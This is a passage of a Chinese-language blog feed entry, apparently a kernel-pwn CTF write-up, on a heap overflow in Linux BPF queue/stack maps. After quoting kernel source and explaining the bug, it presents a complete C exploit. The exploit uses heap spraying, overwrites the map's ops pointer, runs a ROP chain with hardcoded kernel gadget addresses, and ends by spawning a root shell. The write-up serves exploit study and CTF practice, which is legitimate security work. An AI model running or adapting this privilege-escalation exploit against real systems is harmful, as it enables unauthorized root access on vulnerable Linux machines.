-EPERM;</span><br><span class="line">    <span class="keyword">goto</span> err_put;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">    err = PTR_ERR(key);</span><br><span class="line">    <span class="keyword">goto</span> err_put;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">      <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||</span><br><span class="line">      <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||</span><br><span class="line">      <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)</span><br><span class="line">    value_size = round_up(<span class="built_in">map</span>-&gt;value_size, <span class="number">8</span>) * num_possible_cpus();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line"></span><br><span class="line">  err = -ENOMEM;</span><br><span class="line">  value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);</span><br><span class="line">  <span class="keyword">if</span> (!value)</span><br><span class="line">    <span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line">  err = -EFAULT;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(value, uvalue, value_size) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Need to create a kthread, thus must support schedule */</span></span><br><span class="line">  <span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">    err = bpf_map_offload_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_CPUMAP ||</span><br><span class="line">             <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKHASH ||</span><br><span class="line">             <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKMAP) &#123;</span><br><span class="line">    err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里是直接取出map中存储的value_size直接kmalloc一个堆块，然后从用户态copy内容到堆块上面。随后调用ops中的map_update_elem函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">queue_stack_map_push_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     u64 flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span> =</span> bpf_queue_stack(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> irq_flags;</span><br><span class="line">  <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *dst;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* BPF_EXIST is used to force making room for a new element in case the</span></span><br><span class="line"><span class="comment"> * map is full</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">bool</span> replace = (flags &amp; BPF_EXIST);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check supported flags for queue and stack maps */</span></span><br><span class="line">  <span class="keyword">if</span> (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_stack_map_is_full(qs)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!replace) &#123;</span><br><span class="line">      err = -E2BIG;</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* advance tail pointer to overwrite oldest element */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))</span><br><span class="line">      qs-&gt;tail = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;<span class="built_in">map</span>.value_size];</span><br><span class="line">  <span class="built_in">memcpy</span>(dst, value, qs-&gt;<span class="built_in">map</span>.value_size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (unlikely(++qs-&gt;head &gt;= qs-&gt;size))</span><br><span class="line">    qs-&gt;head = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  out:</span><br><span class="line">  raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">raw_spinlock_t</span> lock;</span><br><span class="line">u32 head, tail;</span><br><span class="line">u32 size; <span class="comment">/* max_entries + 1 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> elements[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里利用memcpy将堆块上的内容复制到目标地址。这里查看qs的定义可以看出来其实就是往管理堆块下面相邻的堆块进行写入，但是因为我们上面申请的size只是管理堆块的size这也就导致了我们可以进行堆溢出。</p><h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><p>其实从上面分析到这里可以看出来这里的功能主要是要干嘛的，并且分析出来qs的结构。这里简化一下结构体其实就是类似于msg_msg的一种结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  manager;</span><br><span class="line">  data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过我们每次进行update的时候只能够修改data中的一个小块，而这些小块又被分成了<code>attr-&gt;max_entries + 1</code>个，并且每个小块的size为：<code>attr-&gt;value_size</code>。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>这里主要利用堆风水使我们分配的两个object相邻，接着修改掉ops指针，劫持函数实现站栈迁移即可。</p><p>这里使用到的gadget在 <a href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/">modify_ldt利用</a> 中提到过，不熟悉的可以去看看这里就不再赘述。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_NUMBER 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_bpf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bpf 321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = <span class="number">0xffffffff81c00d5a</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff8106d8f4</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_pivot_gadget = <span class="number">0xffffffff81954dc8</span>;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> res;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_ops[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pointer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *rop_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)buf = <span class="number">0x17</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">8</span>) = <span class="number">0x40</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">12</span>) = <span class="number">-1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">20</span>) = <span class="number">-1</span>;</span><br><span class="line">    res = syscall(__NR_bpf, <span class="number">0</span>, buf, <span class="number">0x2c</span>);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;BPF_MAP_CREATE error!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> victim[SPRAY_NUMBER];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_NUMBER; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        victim[i] = syscall(__NR_bpf, <span class="number">0</span>, buf, <span class="number">0x2c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;spray finished!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_ops[<span class="number">2</span>] = stack_pivot_gadget;</span><br><span class="line">    pointer[<span class="number">6</span>] = fake_ops;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)buf = res;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">16</span>) = pointer;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">24</span>) = <span class="number">2</span>;</span><br><span class="line">    syscall(__NR_bpf, <span class="number">2</span>, buf, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;changed ops\n&quot;</span>);</span><br><span class="line">    rop_addr = mmap(<span class="number">0x81954000</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81029c71</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0x6f0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff810013b9</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xFFFFFFFF810E3D40</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81001c50</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff810013b9</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81264e0b</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xFFFFFFFF810E3AB0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81c00d5a</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0x246</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff8106d8f4</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)get_shell;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_cs;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_rflags;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_sp;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_ss;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(<span class="number">0x81954dc8</span>) = <span class="number">0xffffffff81029c71</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_NUMBER; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(victim[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221002145034272.png"                      alt="image-20221002145034272"                ></p><hr><p>参考链接:<a class="link"   href="http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8" >http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目会放在:&lt;a class=&quot;link&quot;   href=&quot;https://github.com/196082/196082&quot; &gt;https://github.com/196082/196082&lt;i class=&quot;fas fa-external-link-alt&quot;&gt;&lt;/i&gt;</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="bpf" scheme="https://cv196082.gitee.io/tags/bpf/"/>
    
    <category term="堆喷射" scheme="https://cv196082.gitee.io/tags/%E5%A0%86%E5%96%B7%E5%B0%84/"/>
    
  </entry>
  
</feed>
